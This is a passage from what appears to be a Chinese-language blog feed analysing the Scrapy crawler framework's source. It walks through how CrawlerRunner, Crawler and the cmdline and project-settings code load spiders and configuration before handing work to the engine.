spcls</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_load_all_spiders</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> name <span class="keyword">in</span> self.spider_modules:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">for</span> module <span class="keyword">in</span> walk_modules(name):</span><br><span class="line">                    self._load_spiders(module)</span><br><span class="line">            <span class="keyword">except</span> ImportError <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">if</span> self.warn_only:</span><br><span class="line">                    msg = (<span class="string">"\n&#123;tb&#125;Could not load spiders from module '&#123;modname&#125;'. "</span></span><br><span class="line">                           <span class="string">"See above traceback for details."</span>.format(</span><br><span class="line">                                modname=name, tb=traceback.format_exc()))</span><br><span class="line">                    warnings.warn(msg, RuntimeWarning)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">raise</span></span><br><span class="line">        self._check_name_duplicates()</span><br></pre></td></tr></table></figure><p>如类名字和注释一样，加载所有的爬虫，类似于前面的commands加载，组成对应字典。好的，回到<code>CrawlerRunner</code>继续：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crawl</span><span class="params">(self, crawler_or_spidercls, *args, **kwargs)</span>:</span></span><br><span class="line">       <span class="string">"""</span></span><br><span class="line"><span class="string">       Run a crawler with the provided arguments.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       It will call the given Crawler's :meth:`~Crawler.crawl` method, while</span></span><br><span class="line"><span class="string">       keeping track of it so it can be stopped later.</span></span><br><span class="line"><span class="string">#非类而是一个实例</span></span><br><span class="line"><span class="string">       If `crawler_or_spidercls` isn't a :class:`~scrapy.crawler.Crawler`</span></span><br><span class="line"><span class="string">       instance, this method will try to create one using this parameter as</span></span><br><span class="line"><span class="string">       the spider class given to it.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       Returns a deferred that is fired when the crawling is finished.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       :param crawler_or_spidercls: already created crawler, or a spider class</span></span><br><span class="line"><span class="string">           or spider's name inside the project to create it</span></span><br><span class="line"><span class="string">       :type crawler_or_spidercls: :class:`~scrapy.crawler.Crawler` instance,</span></span><br><span class="line"><span class="string">           :class:`~scrapy.spiders.Spider` subclass or string</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       :param list args: arguments to initialize the spider</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       :param dict kwargs: keyword arguments to initialize the spider</span></span><br><span class="line"><span class="string">       """</span></span><br><span class="line">   <span class="comment">#创建crawler实例</span></span><br><span class="line">       crawler = self.create_crawler(crawler_or_spidercls)</span><br><span class="line">       <span class="keyword">return</span> self._crawl(crawler, *args, **kwargs)</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">_crawl</span><span class="params">(self, crawler, *args, **kwargs)</span>:</span></span><br><span class="line">       self.crawlers.add(crawler)</span><br><span class="line">       d = crawler.crawl(*args, **kwargs)</span><br><span class="line">       self._active.add(d)</span><br><span class="line"></span><br><span class="line">       <span class="function"><span class="keyword">def</span> <span class="title">_done</span><span class="params">(result)</span>:</span></span><br><span class="line">           self.crawlers.discard(crawler)</span><br><span class="line">           self._active.discard(d)</span><br><span class="line">           <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> d.addBoth(_done)</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">create_crawler</span><span class="params">(self, crawler_or_spidercls)</span>:</span></span><br><span class="line">       <span class="string">"""</span></span><br><span class="line"><span class="string">       Return a :class:`~scrapy.crawler.Crawler` object.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       * If `crawler_or_spidercls` is a Crawler, it is returned as-is.</span></span><br><span class="line"><span class="string">       * If `crawler_or_spidercls` is a Spider subclass, a new Crawler</span></span><br><span class="line"><span class="string">         is constructed for it.</span></span><br><span class="line"><span class="string">       * If `crawler_or_spidercls` is a string, this function finds</span></span><br><span class="line"><span class="string">         a spider with this name in a Scrapy project (using spider loader),</span></span><br><span class="line"><span class="string">         then creates a Crawler instance for it.</span></span><br><span class="line"><span class="string">       """</span></span><br><span class="line">       <span class="keyword">if</span> isinstance(crawler_or_spidercls, Crawler):</span><br><span class="line">           <span class="keyword">return</span> crawler_or_spidercls</span><br><span class="line">       <span class="keyword">return</span> self._create_crawler(crawler_or_spidercls)</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">_create_crawler</span><span class="params">(self, spidercls)</span>:</span></span><br><span class="line">       <span class="keyword">if</span> isinstance(spidercls, six.string_types):</span><br><span class="line">           spidercls = self.spider_loader.load(spidercls)</span><br><span class="line">        <span class="comment">#OK跟进Crawler类</span></span><br><span class="line">       <span class="keyword">return</span> Crawler(spidercls, self.settings)</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">stop</span><span class="params">(self)</span>:</span></span><br><span class="line">       <span class="string">"""</span></span><br><span class="line"><span class="string">       Stops simultaneously all the crawling jobs taking place.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       Returns a deferred that is fired when they all have ended.</span></span><br><span class="line"><span class="string">       """</span></span><br><span class="line">       <span class="keyword">return</span> defer.DeferredList([c.stop() <span class="keyword">for</span> c <span class="keyword">in</span> list(self.crawlers)])</span><br><span class="line"></span><br><span class="line"><span class="meta">   @defer.inlineCallbacks</span></span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">join</span><span class="params">(self)</span>:</span></span><br><span class="line">       <span class="string">"""</span></span><br><span class="line"><span class="string">       join()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       Returns a deferred that is fired when all managed :attr:`crawlers` have</span></span><br><span class="line"><span class="string">       completed their executions.</span></span><br><span class="line"><span class="string">       """</span></span><br><span class="line">       <span class="keyword">while</span> self._active:</span><br><span class="line">           <span class="keyword">yield</span> defer.DeferredList(self._active)</span><br></pre></td></tr></table></figure><p>跟进<code>Crawler</code>类，这个类很关键：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Crawler</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, spidercls, settings=None)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> isinstance(settings, dict) <span class="keyword">or</span> settings <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            settings = Settings(settings)</span><br><span class="line"></span><br><span class="line">        self.spidercls = spidercls</span><br><span class="line">        self.settings = settings.copy()</span><br><span class="line">        self.spidercls.update_settings(self.settings)</span><br><span class="line"></span><br><span class="line">        self.signals = SignalManager(self)</span><br><span class="line">        self.stats = load_object(self.settings[<span class="string">'STATS_CLASS'</span>])(self)</span><br><span class="line"></span><br><span class="line">        handler = LogCounterHandler(self, level=self.settings.get(<span class="string">'LOG_LEVEL'</span>))</span><br><span class="line">        logging.root.addHandler(handler)</span><br><span class="line">        <span class="keyword">if</span> get_scrapy_root_handler() <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="comment"># scrapy root handler alread installed: update it with new settings</span></span><br><span class="line">            install_scrapy_root_handler(self.settings)</span><br><span class="line">        <span class="comment"># lambda is assigned to Crawler attribute because this way it is not</span></span><br><span class="line">        <span class="comment"># garbage collected after leaving __init__ scope</span></span><br><span class="line">        self.__remove_handler = <span class="keyword">lambda</span>: logging.root.removeHandler(handler)</span><br><span class="line">        self.signals.connect(self.__remove_handler, signals.engine_stopped)</span><br><span class="line"></span><br><span class="line">        lf_cls = load_object(self.settings[<span class="string">'LOG_FORMATTER'</span>])</span><br><span class="line">        self.logformatter = lf_cls.from_crawler(self)</span><br><span class="line">        self.extensions = ExtensionManager.from_crawler(self)</span><br><span class="line"></span><br><span class="line">        self.settings.freeze()</span><br><span class="line">        self.crawling = <span class="literal">False</span></span><br><span class="line">        self.spider = <span class="literal">None</span></span><br><span class="line">        self.engine = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">spiders</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> hasattr(self, <span class="string">'_spiders'</span>):</span><br><span class="line">            warnings.warn(<span class="string">"Crawler.spiders is deprecated, use "</span></span><br><span class="line">                          <span class="string">"CrawlerRunner.spider_loader or instantiate "</span></span><br><span class="line">                          <span class="string">"scrapy.spiderloader.SpiderLoader with your "</span></span><br><span class="line">                          <span class="string">"settings."</span>,</span><br><span class="line">                          category=ScrapyDeprecationWarning, stacklevel=<span class="number">2</span>)</span><br><span class="line">            self._spiders = _get_spider_loader(self.settings.frozencopy())</span><br><span class="line">        <span class="keyword">return</span> self._spiders</span><br><span class="line"></span><br><span class="line"><span class="meta">    @defer.inlineCallbacks</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">crawl</span><span class="params">(self, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">assert</span> <span class="keyword">not</span> self.crawling, <span class="string">"Crawling already taking place"</span></span><br><span class="line">        self.crawling = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">          <span class="comment">#真正建立爬虫实例</span></span><br><span class="line">            self.spider = self._create_spider(*args, **kwargs)</span><br><span class="line">            <span class="comment">#建立引擎</span></span><br><span class="line">            self.engine = self._create_engine()</span><br><span class="line">            <span class="comment">#拿到对应spider的start_request()方法</span></span><br><span class="line">            start_requests = iter(self.spider.start_requests())</span><br><span class="line">            <span class="comment">#执行引擎的open_spider方法，传入刚刚的爬虫实例和方法请求</span></span><br><span class="line">            <span class="keyword">yield</span> self.engine.open_spider(self.spider, start_requests)</span><br><span class="line">            <span class="keyword">yield</span> defer.maybeDeferred(self.engine.start)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="comment"># In Python 2 reraising an exception after yield discards</span></span><br><span class="line">            <span class="comment"># the original traceback (see http://bugs.python.org/issue7563),</span></span><br><span class="line">            <span class="comment"># so sys.exc_info() workaround is used.</span></span><br><span class="line">            <span class="comment"># This workaround also works in Python 3, but it is not needed,</span></span><br><span class="line">            <span class="comment"># and it is slower, so in Python 3 we use native `raise`.</span></span><br><span class="line">            <span class="keyword">if</span> six.PY2:</span><br><span class="line">                exc_info = sys.exc_info()</span><br><span class="line"></span><br><span class="line">            self.crawling = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">if</span> self.engine <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">yield</span> self.engine.close()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> six.PY2:</span><br><span class="line">                six.reraise(*exc_info)</span><br><span class="line">            <span class="keyword">raise</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_create_spider</span><span class="params">(self, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.spidercls.from_crawler(self, *args, **kwargs)</span><br><span class="line"><span class="comment">#进入引擎，事情交给它了</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_create_engine</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> ExecutionEngine(self, <span class="keyword">lambda</span> _: self.stop())</span><br><span class="line"></span><br><span class="line"><span class="meta">    @defer.inlineCallbacks</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">stop</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.crawling:</span><br><span class="line">            self.crawling = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">yield</span> defer.maybeDeferred(self.engine.stop)</span><br></pre></td></tr></table></figure><p><code>crawer.py</code>文件余下代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_signal_shutdown</span><span class="params">(self, signum, _)</span>:</span></span><br><span class="line">      install_shutdown_handlers(self._signal_kill)</span><br><span class="line">      signame = signal_names[signum]</span><br><span class="line">      logger.info(<span class="string">"Received %(signame)s, shutting down gracefully. Send again to force "</span>,</span><br><span class="line">                  &#123;<span class="string">'signame'</span>: signame&#125;)</span><br><span class="line">      reactor.callFromThread(self._graceful_stop_reactor)</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">_signal_kill</span><span class="params">(self, signum, _)</span>:</span></span><br><span class="line">      install_shutdown_handlers(signal.SIG_IGN)</span><br><span class="line">      signame = signal_names[signum]</span><br><span class="line">      logger.info(<span class="string">'Received %(signame)s twice, forcing unclean shutdown'</span>,</span><br><span class="line">                  &#123;<span class="string">'signame'</span>: signame&#125;)</span><br><span class="line">      reactor.callFromThread(self._stop_reactor)</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">start</span><span class="params">(self, stop_after_crawl=True)</span>:</span></span><br><span class="line">      <span class="string">"""</span></span><br><span class="line"><span class="string">      This method starts a Twisted `reactor`_, adjusts its pool size to</span></span><br><span class="line"><span class="string">      :setting:`REACTOR_THREADPOOL_MAXSIZE`, and installs a DNS cache based</span></span><br><span class="line"><span class="string">      on :setting:`DNSCACHE_ENABLED` and :setting:`DNSCACHE_SIZE`.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">      If `stop_after_crawl` is True, the reactor will be stopped after all</span></span><br><span class="line"><span class="string">      crawlers have finished, using :meth:`join`.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">      :param boolean stop_after_crawl: stop or not the reactor when all</span></span><br><span class="line"><span class="string">          crawlers have finished</span></span><br><span class="line"><span class="string">      """</span></span><br><span class="line">      <span class="keyword">if</span> stop_after_crawl:</span><br><span class="line">          d = self.join()</span><br><span class="line">          <span class="comment"># Don't start the reactor if the deferreds are already fired</span></span><br><span class="line">          <span class="keyword">if</span> d.called:</span><br><span class="line">              <span class="keyword">return</span></span><br><span class="line">          d.addBoth(self._stop_reactor)</span><br><span class="line"><span class="comment">#开始运行</span></span><br><span class="line">      reactor.installResolver(self._get_dns_resolver())</span><br><span class="line">      tp = reactor.getThreadPool()</span><br><span class="line">      tp.adjustPoolsize(maxthreads=self.settings.getint(<span class="string">'REACTOR_THREADPOOL_MAXSIZE'</span>))</span><br><span class="line">      reactor.addSystemEventTrigger(<span class="string">'before'</span>, <span class="string">'shutdown'</span>, self.stop)</span><br><span class="line">      reactor.run(installSignalHandlers=<span class="literal">False</span>)  <span class="comment"># blocking call</span></span><br></pre></td></tr></table></figure><h1 id="0x02-小结"><a href="#0x02-小结" class="headerlink" title="0x02.小结"></a>0x02.小结</h1><p>上回说到创建<code>crawlerprocess</code>实例,该实例中主要加载对应的配置文件(找到用户写的爬虫类位置)，同时加载用户自己写的爬虫类并实例化，最后交给引擎处理。等于说到这里我们刚进行了官方构建那张图的第一步：将<code>start_request</code>交给引擎处理。结合上一篇，话说也应该如此，你要得到有哪些命令才能让程序明白你写的命令啊，你要得到有哪些爬虫才能让程序读懂你此时要运行那个爬虫啊！！！下次进入引擎看看其如何调度。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00.前言&quot;&gt;&lt;/a&gt;0x00.前言&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://myndtt.github.io/2018/01/30/scrapy-浅分析-一/&quot;&gt;前面提到了&lt;/a&gt;，所以目前要开始从&lt;code&gt;crawl&lt;/code&gt;说起，也即&lt;code&gt;cmdline.py&lt;/code&gt;文件里面的如下代码&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;cmd.crawler_process = CrawlerProcess(settings)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;_run_print_help(parser, _run_command, cmd, args, opts)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sys.exit(cmd.exitcode)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;所以先进入&lt;code&gt;crawler.py&lt;/code&gt;文件找到&lt;code&gt;CrawlerProcess&lt;/code&gt;类。&lt;/p&gt;
    
    </summary>
    
    
      <category term="python" scheme="https://myndtt.github.io/tags/python/"/>
    
      <category term="scrapy" scheme="https://myndtt.github.io/tags/scrapy/"/>
    
  </entry>
  
  <entry>
    <title>scrapy 浅分析(一)</title>
    <link href="https://myndtt.github.io/2018/01/30/scrapy-%E6%B5%85%E5%88%86%E6%9E%90-%E4%B8%80/"/>
    <id>https://myndtt.github.io/2018/01/30/scrapy-浅分析-一/</id>
    <published>2018-01-30T07:13:40.000Z</published>
    <updated>2019-09-22T05:04:46.317Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00.前言"></a>0x00.前言</h1><p>相信大家都用过python的scrapy框架写给爬虫。然后就想看看这个框架的简单执行流程。</p><h1 id="0x01-大体架构"><a href="#0x01-大体架构" class="headerlink" title="0x01.大体架构"></a>0x01.大体架构</h1><p>官方架构图如下</p><p><img src="http://myndtt.github.io/images/58.png" alt="architecture"></p><p>图大体架构很清晰，实际以例子来看看，一般我们的爬虫以如下代码开始运行(命令行是一样的)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scrapy <span class="keyword">import</span> cmdline</span><br><span class="line"></span><br><span class="line">cmdline.execute(<span class="string">"scrapy crawl xxx"</span>.split())</span><br></pre></td></tr></table></figure><a id="more"></a><p><img src="http://myndtt.github.io/images/57.png" alt="57"></p><p>找到scrapy安装的包文件，上述代码即为运行<code>cmdline.py</code>文件里面的<code>execute()</code>函数，该函数较长，阶段看</p><p>如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute</span><span class="params">(argv=None, settings=None)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> argv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        argv = sys.argv</span><br><span class="line"></span><br><span class="line">    <span class="comment"># --- backwards compatibility for scrapy.conf.settings singleton ---</span></span><br><span class="line">    <span class="keyword">if</span> settings <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">and</span> <span class="string">'scrapy.conf'</span> <span class="keyword">in</span> sys.modules:</span><br><span class="line">        <span class="keyword">from</span> scrapy <span class="keyword">import</span> conf</span><br><span class="line">        <span class="keyword">if</span> hasattr(conf, <span class="string">'settings'</span>):</span><br><span class="line">            settings = conf.settings</span><br><span class="line">    <span class="comment"># ------------------------------------------------------------------</span></span><br></pre></td></tr></table></figure><p>这里得到外部参数，然后即为注释所说为兼容性操作,此处继续为<code>cmdline.py</code>文件。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> settings <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">     settings = get_project_settings()</span><br><span class="line">     <span class="comment"># set EDITOR from environment if available</span></span><br><span class="line">     <span class="keyword">try</span>:</span><br><span class="line">         editor = os.environ[<span class="string">'EDITOR'</span>]</span><br><span class="line">     <span class="keyword">except</span> KeyError: <span class="keyword">pass</span></span><br><span class="line">     <span class="keyword">else</span>:</span><br><span class="line">         settings[<span class="string">'EDITOR'</span>] = editor</span><br><span class="line"> check_deprecated_settings(settings)</span><br><span class="line"></span><br><span class="line"> <span class="comment"># --- backwards compatibility for scrapy.conf.settings singleton ---</span></span><br><span class="line"> <span class="keyword">import</span> warnings</span><br><span class="line"> <span class="keyword">from</span> scrapy.exceptions <span class="keyword">import</span> ScrapyDeprecationWarning</span><br><span class="line"> <span class="keyword">with</span> warnings.catch_warnings():</span><br><span class="line">     warnings.simplefilter(<span class="string">"ignore"</span>, ScrapyDeprecationWarning)</span><br><span class="line">     <span class="keyword">from</span> scrapy <span class="keyword">import</span> conf</span><br><span class="line">     conf.settings = settings</span><br><span class="line"> <span class="comment"># ------------------------------------------------------------------</span></span><br></pre></td></tr></table></figure><p>执行<code>get_project_settings()</code>函数，全局寻找跟进得，此处为<code>utils</code>文件夹下的<code>project.py</code>文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_project_settings</span><span class="params">()</span>:</span></span><br><span class="line">  <span class="comment">#ENVVAR = 'SCRAPY_SETTINGS_MODULE',变量所在文件中已经定义了</span></span><br><span class="line">    <span class="keyword">if</span> ENVVAR <span class="keyword">not</span> <span class="keyword">in</span> os.environ:</span><br><span class="line">        project = os.environ.get(<span class="string">'SCRAPY_PROJECT'</span>, <span class="string">'default'</span>)</span><br><span class="line">        <span class="comment">#project此时为default，下面进行初始化</span></span><br><span class="line">        init_env(project)</span><br></pre></td></tr></table></figure><p><code>Init_env()</code>函数如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_env</span><span class="params">(project=<span class="string">'default'</span>, set_syspath=True)</span>:</span></span><br><span class="line">    <span class="string">"""Initialize environment to use command-line tool from inside a project</span></span><br><span class="line"><span class="string">    dir. This sets the Scrapy settings module and modifies the Python path to</span></span><br><span class="line"><span class="string">    be able to locate the project module.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    cfg = get_config()</span><br><span class="line">    <span class="keyword">if</span> cfg.has_option(<span class="string">'settings'</span>, project):</span><br><span class="line">        os.environ[<span class="string">'SCRAPY_SETTINGS_MODULE'</span>] = cfg.get(<span class="string">'settings'</span>, project)</span><br><span class="line">    closest = closest_scrapy_cfg()</span><br><span class="line">    <span class="keyword">if</span> closest:</span><br><span class="line">        projdir = os.path.dirname(closest)</span><br><span class="line">        <span class="keyword">if</span> set_syspath <span class="keyword">and</span> projdir <span class="keyword">not</span> <span class="keyword">in</span> sys.path:</span><br><span class="line">            sys.path.append(projdir)</span><br></pre></td></tr></table></figure><p>如注释所说，初始化环境,循环递归找到用户项目中的配置文件<code>settings.py</code>,并且将其设置到环境变量<code>SCRAPY_SETTINGS_MODULE</code>中。然后继续<code>get_project_settings</code>函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#创建settings实例，根据包导入情况，from scrapy.settings import Settings，进入settings文件夹可发 #现此过程同时加载默认配置文件default_settings.pys</span></span><br><span class="line"> settings = Settings()</span><br><span class="line">   <span class="comment">#得到用户配置文件路径</span></span><br><span class="line">   settings_module_path = os.environ.get(ENVVAR)</span><br><span class="line">   <span class="comment">#更新配置，有则覆盖</span></span><br><span class="line">   <span class="keyword">if</span> 